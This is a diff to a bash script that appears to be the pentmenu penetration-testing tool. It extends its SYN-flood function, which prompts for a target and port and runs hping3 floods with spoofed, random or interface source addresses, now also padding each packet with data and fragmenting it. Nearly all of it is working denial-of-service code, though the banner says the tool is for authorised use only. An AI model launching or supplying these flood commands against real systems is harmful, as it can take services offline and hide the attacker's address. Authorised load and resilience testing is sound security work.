@@ -174,22 +174,34 @@ synflood()
 		echo "Enter target:"
 	read -i $TARGET -e TARGET
 		echo "Enter target port"
-	read PORT
+	read -i $PORT -e PORT
 		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
 	read -i $SOURCE -e SOURCE
 	: ${SOURCE:=i}
+	echo "Send data with SYN packet? [y]es or [n]o (default)"
+	read -i $SENDDATA -e SENDDATA
+	: ${SENDDATA:=n}
+	if [[ $SENDDATA = y ]]; then
+	echo "Enter number of data bytes to send (default 3000):"
+	read -i $DATA -e DATA
+	: ${DATA:=3000}
+	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
+	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
+	fi
+	else DATA=0 
+	fi
 	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --spoof $SOURCE -p $PORT -S $TARGET
+		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "r" ]; then
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --rand-source -p $PORT -S $TARGET
+		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
 	elif [ "$SOURCE" = "i" ]; then
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -p $PORT -S $TARGET
+		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
 	else echo "Not a valid option!  Using interface IP"
 		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -p $PORT -S $TARGET
+		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
 	fi
 ## No hping3 so using nping for TCP SYN Flood
 	else echo "hping3 not found :( trying nping instead"
@@ -531,6 +543,7 @@ checkuptime()
 ## create menu and show welcome message
 	clear && echo ""
 	echo "Hello and welcome to pentmenu!"
+	echo "Please report all bugs, improvements and suggestions to https://github.com/GinjaChris/pentmenu/issues"
 	echo "This software is only for responsible, authorised use."
 	echo "YOU are responsible for your own actions!"
 	echo ""
